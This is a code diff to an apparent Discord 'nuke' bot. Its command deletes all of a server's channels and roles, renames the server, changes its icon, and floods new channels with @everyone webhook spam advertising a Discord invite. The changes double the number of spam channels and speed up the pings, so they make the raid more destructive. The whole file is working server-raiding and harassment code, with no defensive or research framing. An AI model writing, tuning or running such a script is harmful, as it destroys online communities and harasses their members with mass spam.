@@ -12,7 +12,7 @@ webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2
 spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
 guild_name = "JHUB ON TOP"
 guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
-channels_to_create = 20
+channels_to_create = 40
 pings_per_channel = 100
 
 # Bot setup
@@ -29,22 +29,22 @@ async def nuke(ctx):
     guild = ctx.guild
     print("⚠️ Starting NUKE sequence...")
 
-    # Delete all channels sequentially with delay
+    # Delete all channels with delay
     for channel in list(guild.channels):
         try:
             await channel.delete()
             await asyncio.sleep(0.5)
         except Exception as e:
-            print(f"Failed to delete channel {channel.name}: {e}")
+            print(f"❌ Failed to delete channel {channel.name}: {e}")
 
-    # Delete all roles except @everyone sequentially with delay
+    # Delete all roles except @everyone
     for role in list(guild.roles):
         if role.name != "@everyone":
             try:
                 await role.delete()
                 await asyncio.sleep(0.5)
             except Exception as e:
-                print(f"Failed to delete role {role.name}: {e}")
+                print(f"❌ Failed to delete role {role.name}: {e}")
 
     # Rename server and change icon
     try:
@@ -56,18 +56,20 @@ async def nuke(ctx):
     except Exception as e:
         print(f"❌ Failed to change server name/icon: {e}")
 
-    # Create channels and spam sequentially with delays
+    # Create channels and spam with adjusted delays
     for i in range(channels_to_create):
         try:
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
-            await asyncio.sleep(0.3)  # Delay before webhook creation
+            await asyncio.sleep(0.5)  # Slower channel creation
             webhook = await channel.create_webhook(name=webhook_name)
+
             for _ in range(pings_per_channel):
                 try:
                     await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
-                    await asyncio.sleep(0.2)  # Delay between pings
+                    await asyncio.sleep(0.1)  # Faster pinging
                 except Exception as e:
                     print(f"❌ Webhook send failed in channel {channel.name}: {e}")
+
         except Exception as e:
             print(f"❌ Failed to create/spam channel {i}: {e}")
 
